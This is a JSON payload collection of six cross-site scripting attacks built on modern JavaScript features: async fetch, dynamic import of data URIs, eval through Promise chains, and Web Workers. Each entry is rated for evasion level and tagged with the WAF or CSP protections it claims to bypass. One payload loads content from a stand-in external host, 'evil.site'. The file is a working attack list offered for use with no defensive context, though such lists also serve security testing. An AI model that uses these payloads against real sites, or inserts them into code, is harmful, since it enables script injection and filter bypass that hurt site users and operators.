{
  "category": "async_modern_js",
  "description": "Modern JavaScript async/await and module-based XSS exploits for contemporary web applications",
  "difficulty": "god_tier",
  "payloads": [
    {
      "name": "async_fetch_xss",
      "payload": "(async()=>await(await fetch('//evil.site')).text())()",
      "description": "Async/await fetch XSS with external script loading",
      "context": ["javascript", "async", "modern_js"],
      "encoding": "none",
      "evasion_level": 8,
      "waf_bypass": ["generic", "basic"]
    },
    {
      "name": "dynamic_import_xss", 
      "payload": "import('data:text/javascript,alert(1)')",
      "description": "Dynamic import() with data URI for module injection",
      "context": ["javascript", "module", "es6"],
      "encoding": "none",
      "evasion_level": 9,
      "waf_bypass": ["csp", "module_based"]
    },
    {
      "name": "import_meta_xss",
      "payload": "import('data:text/javascript,eval(\"alert(1)\")')",
      "description": "Module import with eval payload",
      "context": ["javascript", "module", "eval"],
      "encoding": "none",
      "evasion_level": 9,
      "waf_bypass": ["module_based", "generic"]
    },
    {
      "name": "async_eval_obfuscated",
      "payload": "(async()=>{const a=await import('data:text/javascript,const b=eval;b(\"alert(1)\")');})();",
      "description": "Obfuscated async eval via dynamic import",
      "context": ["javascript", "async", "obfuscated"],
      "encoding": "variable_obfuscation",
      "evasion_level": 10,
      "waf_bypass": ["all"]
    },
    {
      "name": "promise_chain_xss",
      "payload": "Promise.resolve().then(()=>eval('alert(1)'))",
      "description": "Promise chain with eval execution",
      "context": ["javascript", "promise", "async"],
      "encoding": "none",
      "evasion_level": 7,
      "waf_bypass": ["basic", "generic"]
    },
    {
      "name": "worker_script_xss",
      "payload": "new Worker('data:application/javascript,self.postMessage(eval(\"alert(1)\"))')",
      "description": "Web Worker with eval payload execution",
      "context": ["javascript", "worker", "threading"],
      "encoding": "none",
      "evasion_level": 9,
      "waf_bypass": ["worker_based", "csp"]
    }
  ]
}
